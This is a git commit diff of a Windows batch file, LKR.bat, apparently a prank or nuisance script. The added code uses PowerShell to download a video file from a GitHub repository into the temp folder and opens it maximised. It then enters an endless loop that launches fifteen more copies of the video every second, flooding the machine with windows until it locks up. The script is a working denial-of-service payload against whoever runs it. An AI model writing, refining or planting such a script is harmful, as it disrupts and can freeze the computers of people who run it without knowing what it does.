5893a464273653649115752d9d2b716cbe29854a
LKR-beta <gbu23224@gmail.com>
2026-05-17 12:45:30 +0900

    Update LKR.bat

--- LKR.bat
+++ LKR.bat
@@ -1,43 +1,27 @@
 @echo off
 cls
 
+set "file=Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4"
+set "path=%temp%\%file%"
 
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4','C:\your\asylum\Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4)"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4','%path%')"
 
-start max Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+if not exist "%path%" (
+    echo download failed
+    pause
+    exit
+)
 
-timeout /t 10
+start "" /max "%path%"
+
+timeout /t 10 >nul
 
 :loop
 
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+for /l %%i in (1,1,15) do (
+    start "" "%path%"
+)
 
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
-
-start  Video_92dc61cd-1e80-4514-a61b-6ae71794d0cd.mp4
+timeout /t 1 >nul
 
 goto loop
